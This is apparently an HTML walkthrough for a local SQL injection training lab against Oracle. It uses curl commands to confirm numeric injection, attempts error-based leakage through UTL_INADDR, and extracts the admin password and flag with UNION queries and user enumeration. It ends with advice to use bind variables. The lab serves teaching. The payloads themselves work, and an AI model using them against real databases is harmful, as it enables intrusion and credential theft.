<h4>Step 1: Test Normal Lookup</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Lookup</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/oracle/lab4" \<br> --data-urlencode "id=1"<br><br>
        <span class="prompt">Input: </span>1<br>
        <span class="prompt">SQL: </span>SELECT username, email FROM users WHERE id = 1<br><br>
        <span class="prompt">Output: </span><strong>User Found:</strong> admin (admin@sqli-arena.local)
    </div>
</div>

<h4>Step 2: Confirm Numeric Injection</h4>
<p>No quotes needed: the ID is injected directly into the SQL as a number.</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Boolean Injection</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "..." --data-urlencode "id=1 AND 1=1"<br>
        <span class="prompt">Input: </span>1 AND 1=1<br>
        <span class="prompt">Result: </span><strong>User Found:</strong> admin (admin@sqli-arena.local) (TRUE condition -- works)<br><br>
        <span class="prompt">$ </span>curl -s "..." --data-urlencode "id=1 AND 1=2"<br>
        <span class="prompt">Input: </span>1 AND 1=2<br>
        <span class="prompt">Result: </span><strong>No user found</strong> with that ID. (FALSE condition -- filtered)<br>
        <span class="prompt">// Numeric injection confirmed</span>
    </div>
</div>

<h4>Step 3: UTL_INADDR.GET_HOST_ADDRESS (Tested)</h4>
<p>
    <code>UTL_INADDR.GET_HOST_ADDRESS(hostname)</code> resolves a hostname to an IP address.
    When given an invalid hostname (like a flag string), it throws <code>ORA-29257: host X unknown</code>,
    leaking the value. However, this requires network ACL permissions.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. UTL_INADDR Attempt</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/oracle/lab4" \<br> --data-urlencode "id=1 AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT password FROM users WHERE ROWNUM <= 1))"<br><br>
        <span class="prompt">Input: </span>1 AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT password FROM users WHERE ROWNUM &lt;= 1))<br>
        <span class="prompt">Error: </span><strong>ORA-24247: network access denied by access control list (ACL)</strong><br>
        ORA-06512: at "SYS.UTL_INADDR", line 19<br>
        ORA-06512: at "SYS.UTL_INADDR", line 40<br><br>
        <span class="prompt">// ACL blocks network access on Oracle XE. In older Oracle or with ACL granted:</span><br>
        <span class="prompt">Expected: </span>ORA-29257: host FLAG{or_utl_1n4ddr_3rr0r} unknown<br>
        <span class="prompt">// The hostname value would be leaked in the error message</span>
    </div>
</div>

<h4>Step 4: UNION-Based Extraction (Working Approach)</h4>
<p>
    Since this is a 2-column query (username, email), we can use UNION to extract data directly.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. UNION Flag Extraction</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/oracle/lab4" \<br> --data-urlencode "id=0 UNION SELECT password, email FROM users WHERE username='admin'"<br><br>
        <span class="prompt">Input: </span>0 UNION SELECT password, email FROM users WHERE username='admin'<br>
        <span class="prompt">SQL: </span>...WHERE id = 0 UNION SELECT password, email FROM users WHERE username='admin'<br><br>
        <span class="prompt">Output: </span><strong>User Found:</strong> <strong>FLAG{or_utl_1n4ddr_3rr0r}</strong> (admin@sqli-arena.local)
    </div>
</div>

<h4>Step 5: Other Error-Based Techniques</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. Alternative Error Techniques</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">TO_NUMBER:      </span>1 AND 1=TO_NUMBER((SELECT password FROM users WHERE ROWNUM&lt;=1))<br>
        <span class="prompt">Error:          </span>ORA-01722: invalid number (value NOT shown)<br><br>
        <span class="prompt">UTL_INADDR:     </span>Requires network ACL permissions (ORA-24247 without it)<br>
        <span class="prompt">UTL_HTTP:       </span>Requires network ACL (ORA-24247)<br>
        <span class="prompt">DBMS_ASSERT:    </span>ORA-44002: invalid object name (value NOT shown)<br><br>
        <span class="prompt">// Oracle XE error messages don't leak string values like MSSQL's CONVERT does.</span><br>
        <span class="prompt">// UNION-based extraction is more reliable in Oracle XE.</span>
    </div>
</div>

<h4>Step 6: Enumerate All Users</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 6. User Enumeration</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>0 UNION SELECT username || ':' || password, email FROM users WHERE ROWNUM &lt;= 5<br>
        <span class="prompt">// Only first row returned (single oci_fetch_assoc call)</span><br>
        <span class="prompt">// Use OFFSET or subquery to get subsequent rows:</span><br>
        <span class="prompt">Input: </span>0 UNION SELECT password, 'x' FROM (SELECT password, ROWNUM r FROM users) WHERE r = 2
    </div>
</div>

<h4>Step 7: Submit the Flag</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{or_utl_1n4ddr_3rr0r}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/oracle/lab4" \<br> --data-urlencode "id=0 UNION SELECT password, email FROM users WHERE username='admin'"<br><br>
        <span class="prompt">// Verified output:</span><br>
        <strong>User Found:</strong> FLAG{or_utl_1n4ddr_3rr0r} (admin@sqli-arena.local)
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> <code>UTL_INADDR.GET_HOST_ADDRESS()</code> is an Oracle-specific
    error-based technique that leaks data through DNS resolution errors (<code>ORA-29257: host X unknown</code>).
    It requires the <code>EXECUTE</code> privilege on <code>UTL_INADDR</code> and network ACL permissions.
    In restricted environments (like Oracle XE without ACL), the error shows <code>ORA-24247</code>
    without leaking data. UNION-based extraction remains the most reliable fallback. Always use
    bind variables and restrict privileges on UTL packages.
</div>
